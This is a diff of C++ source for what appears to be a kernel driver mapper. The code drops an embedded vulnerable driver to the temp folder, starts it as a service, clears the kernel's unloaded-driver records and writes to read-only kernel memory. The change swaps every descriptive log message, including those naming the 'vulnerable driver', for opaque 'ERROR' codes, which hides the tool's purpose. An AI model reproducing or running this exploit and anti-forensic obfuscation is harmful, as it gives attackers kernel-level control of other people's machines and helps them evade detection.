@@ -2,14 +2,13 @@
 
 HANDLE intel_driver::Load()
 {
-	std::cout << "[<] Loading vulnerable driver" << std::endl;
 
 	char temp_directory[MAX_PATH] = { 0 };
 	const uint32_t get_temp_path_ret = GetTempPathA(sizeof(temp_directory), temp_directory);
 
 	if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH)
 	{
-		std::cout << "[-] Failed to get temp path" << std::endl;
+		std::cout << "[-] ERROR 16" << std::endl;
 		return nullptr;
 	}
 
@@ -18,13 +17,13 @@ HANDLE intel_driver::Load()
 
 	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver)))
 	{
-		std::cout << "[-] Failed to create vulnerable driver file" << std::endl;
+		std::cout << "[-] ERROR 17" << std::endl;
 		return nullptr;
 	}
 
 	if (!service::RegisterAndStart(driver_path))
 	{
-		std::cout << "[-] Failed to register and start service for the vulnerable driver" << std::endl;
+		std::cout << "[-] ERROR 18" << std::endl;
 		std::remove(driver_path.c_str());
 		return nullptr;
 	}
@@ -34,8 +33,6 @@ HANDLE intel_driver::Load()
 
 void intel_driver::Unload(HANDLE device_handle)
 {
-	std::cout << "[<] Unloading vulnerable driver" << std::endl;
-
 	ClearMmUnloadedDrivers(device_handle);
 	CloseHandle(device_handle);
 
@@ -154,7 +151,7 @@ bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address,
 
 	if (!GetPhysicalAddress(device_handle, address, &physical_address))
 	{
-		std::cout << "[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl;
+		std::cout << "[-] ERROR 19 0x" << reinterpret_cast<void*>(address) << std::endl;
 		return false;
 	}
 
@@ -162,14 +159,14 @@ bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address,
 
 	if (!mapped_physical_memory)
 	{
-		std::cout << "[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl;
+		std::cout << "[-] ERROR 20 0x" << reinterpret_cast<void*>(physical_address) << std::endl;
 		return false;
 	}
 
 	bool result = WriteMemory(device_handle, mapped_physical_memory, buffer, size);
 
 	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
-		std::cout << "[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl;
+		std::cout << "[!] ERROR 21 0x" << reinterpret_cast<void*>(physical_address) << std::endl;
 
 	return result;
 }
@@ -275,7 +272,7 @@ bool intel_driver::GetNtGdiDdDDIReclaimAllocations2KernelInfo(HANDLE device_hand
 
 		if (!kernel_NtGdiDdDDIReclaimAllocations2)
 		{
-			std::cout << "[-] Failed to get export win32kbase.NtGdiDdDDIReclaimAllocations2" << std::endl;
+			std::cout << "[-] ERROR 22" << std::endl;
 			return false;
 		}
 
@@ -311,7 +308,7 @@ bool intel_driver::GetNtGdiGetCOPPCompatibleOPMInformationInfo(HANDLE device_han
 
 		if (!kernel_NtGdiGetCOPPCompatibleOPMInformation)
 		{
-			std::cout << "[-] Failed to get export win32kfull.NtGdiGetCOPPCompatibleOPMInformation" << std::endl;
+			std::cout << "[-] ERROR 23" << std::endl;
 			return false;
 		}
 
